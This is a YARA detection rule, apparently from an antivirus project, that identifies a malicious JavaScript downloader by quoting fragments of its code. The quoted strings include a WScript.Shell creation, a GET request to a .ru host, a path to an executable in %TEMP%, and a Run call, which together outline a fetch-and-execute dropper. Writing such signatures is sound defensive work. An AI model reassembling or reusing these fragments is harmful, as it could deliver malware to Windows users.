rule sig_20160330_c838214a172f826ed7abdea9c2f3be61 {
  meta:
    description = "datamaliciousorder - file 20160330_c838214a172f826ed7abdea9c2f3be61.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "244027a4717f57c8e8080d178484b4c0a5b6d71a274480722f971b9ec5c6494a"

  strings:
    $s1  = "var U0 = function N0() {return WScript[XN](\"WScript\"+\".Shell\");}(), K0 = 11;" fullword ascii
    $s2  = "CM[QU](\"GET\", \"http://jafes.ru/b0ros\", false);" fullword ascii
    $s3  = "function N1(QG, TV){V = V * 1; return QG - TV;};" fullword ascii
    $s4  = "if (CM[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function L(){return L0 + \"\";};" fullword ascii
    $s6  = "function NQ() {return U0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"HKNzkQCpB7A.ex\" + \"e\";};" fullword ascii
    $s7  = "function CG(YS){U0[\"Run\"](YS, V, V);};" fullword ascii
    $s8  = "function S() {return ((QC == true) && (QC == U)) ? 1 : V;};" fullword ascii
    $s9  = "function Y(){return 22;};" fullword ascii
    $s10 = "function N(GC) {var K = (1, 2, 3, 4, 5, GC); return K;};" fullword ascii
    $s11 = "return N1(S1, KZ);" fullword ascii
    $s12 = "var ZW = new this[\"Date\"]();" fullword ascii
    $s13 = "function BL()" fullword ascii
    $s14 = "function I(){return XN;};" fullword ascii
    $s15 = "}while (N2);" fullword ascii
    $s16 = "U = true; " fullword ascii
    $s17 = "var U = false;" fullword ascii
    $s18 = "var QC = false;" fullword ascii
    $s19 = "QC = true; " fullword ascii
    $s20 = "} catch(K1){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}